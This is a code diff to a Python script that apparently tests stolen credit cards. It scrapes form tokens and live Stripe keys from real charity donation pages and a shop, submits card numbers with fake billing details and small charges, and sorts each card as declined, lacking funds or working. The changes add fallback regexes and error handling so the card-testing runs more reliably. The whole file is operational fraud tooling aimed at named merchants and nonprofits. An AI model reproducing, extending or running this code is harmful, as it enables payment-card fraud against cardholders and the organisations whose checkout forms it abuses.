@@ -1,3 +1,6 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
 import requests
 import json
 import re
@@ -40,7 +43,7 @@ def generate_user_agent():
     return random.choice(ua_list)
 
 # ============================================================================
-# Global constants for compatibility
+# Global constants for compatibility (used by complete_handler.py)
 # ============================================================================
 PAYPAL_SITE = "http://bavashdesigns.com"
 PAYPAL_AMOUNT = 0.05
@@ -74,24 +77,47 @@ def check_paypal_working(cc, proxy=None):
             headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
             r = s.get(SITE_URL, headers=headers, timeout=30)
             html = r.text
+
+            # If the page contains a redirect to an iframe, follow it
             if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
                 fid = re.search(r'form-id[=]+(\d+)', html)
                 if fid:
                     iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
                     r2 = s.get(iframe, headers=headers, timeout=30)
                     html = r2.text
+
+            # Try multiple regex patterns for form fields
             fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+            if not fp:
+                fp = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
             fi = re.search(r'name="give-form-id" value="(.*?)"', html)
+            if not fi:
+                fi = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
             nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
+            if not nc:
+                nc = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
             if not all([fp, fi, nc]):
-                return None
+                # Maybe the page uses a different plugin? Try to find in scripts
+                # Look for data-client-token in a script
+                pass
+
+            # Find client token (often in a script tag)
             enc = re.search(r'"data-client-token":"(.*?)"', html)
             if not enc:
+                enc = re.search(r'data-client-token="([^"]+)"', html)
+            if not enc:
+                # Try to find in a script with json
+                script_match = re.search(r'<script[^>]*>.*?data-client-token.*?:\s*"([^"]+)"', html, re.DOTALL)
+                if script_match:
+                    enc = script_match
+            if not enc:
                 return None
+
             dec = base64.b64decode(enc.group(1)).decode('utf-8')
             au = re.search(r'"accessToken":"(.*?)"', dec)
             if not au:
                 return None
+
             return {
                 'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
                 'at': au.group(1), 'session': s
@@ -256,7 +282,6 @@ def check_braintree(cc, proxy=None):
             yy = ex[2:]
         else:
             yy = ex
-        # Braintree expects 2‑digit year
         if len(yy) == 4:
             yy = yy[2:]
         if len(yy) != 2:
@@ -281,7 +306,15 @@ def check_braintree(cc, proxy=None):
         # 2. Get address nonce
         resp = session.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
                            headers=headers, timeout=30)
-        address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', resp.text).group(1)
+        address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', resp.text)
+        if not address_nonce:
+            address_nonce = re.search(r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"', resp.text)
+        if not address_nonce:
+            # Fallback: try to find in a script
+            address_nonce = re.search(r'woocommerce-edit-address-nonce" value="([^"]+)"', resp.text)
+        if not address_nonce:
+            return "Failed to get address nonce", "ERROR"
+        address_nonce = address_nonce.group(1)
 
         # 3. Set billing address
         data = {
@@ -306,8 +339,19 @@ def check_braintree(cc, proxy=None):
         # 4. Get payment page nonces
         resp = session.get('https://shop.trifectanutrition.com/my-account/add-payment-method/',
                            headers=headers, timeout=30)
-        payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text).group(1)
-        client_token_nonce = re.search(r'client_token_nonce":"([^"]+)"', resp.text).group(1)
+        payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', resp.text)
+        if not payment_nonce:
+            payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', resp.text)
+        if not payment_nonce:
+            return "Failed to get payment nonce", "ERROR"
+        payment_nonce = payment_nonce.group(1)
+
+        client_token_nonce = re.search(r'client_token_nonce":"([^"]+)"', resp.text)
+        if not client_token_nonce:
+            client_token_nonce = re.search(r'client_token_nonce":"([^"]+)"', resp.text)
+        if not client_token_nonce:
+            return "Failed to get client token nonce", "ERROR"
+        client_token_nonce = client_token_nonce.group(1)
 
         # 5. Get Braintree client token
         data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
@@ -431,10 +475,34 @@ def check_stripe_local(cc, proxy=None):
         resp = session.get('https://bambifoundation.org/donate-now/', headers=headers, timeout=30)
         html = resp.text
 
-        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
-        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
-        form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
-        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html).group(1)
+        # Extract required fields with fallbacks
+        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html)
+        if not form_hash:
+            form_hash = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
+        if not form_hash:
+            return "Failed to extract form hash", "ERROR"
+        form_hash = form_hash.group(1)
+
+        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+        if not form_prefix:
+            form_prefix = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
+        if not form_prefix:
+            return "Failed to extract form prefix", "ERROR"
+        form_prefix = form_prefix.group(1)
+
+        form_id = re.search(r'name="give-form-id" value="(.*?)"', html)
+        if not form_id:
+            form_id = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
+        if not form_id:
+            return "Failed to extract form id", "ERROR"
+        form_id = form_id.group(1)
+
+        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
+        if not pk_live:
+            pk_live = re.search(r'pk_live_[A-Za-z0-9_-]+', html)
+        if not pk_live:
+            return "Failed to extract Stripe publishable key", "ERROR"
+        pk_live = pk_live.group(1)
 
         # 2. Initial donation setup (POST to admin-ajax)
         headers = {
@@ -509,6 +577,7 @@ def check_stripe_local(cc, proxy=None):
             'sec-fetch-site': 'same-site',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
         }
+        # Prepare the data string
         data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
         resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, timeout=30)
         payment_method_id = resp.json()['id']
@@ -578,6 +647,7 @@ def check_stripe_local(cc, proxy=None):
         resp = session.post('https://bambifoundation.org/donate-now/', params=params, headers=headers, data=data, timeout=30)
         text = resp.text
 
+        # Parse response
         if 'Your card was declined.' in text:
             return "Card declined", "DECLINED"
         elif 'Your card has insufficient funds.' in text:
@@ -587,6 +657,11 @@ def check_stripe_local(cc, proxy=None):
         elif 'Your card number is incorrect.' in text:
             return "Invalid card number", "DECLINED"
         else:
+            # Try to extract error message from response
+            error_match = re.search(r'<div class="give_error[^>]*>(.*?)</div>', text, re.DOTALL)
+            if error_match:
+                error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
+                return f"Error: {error_msg}", "DECLINED"
             return "Unknown response", "ERROR"
 
     except Exception as e:
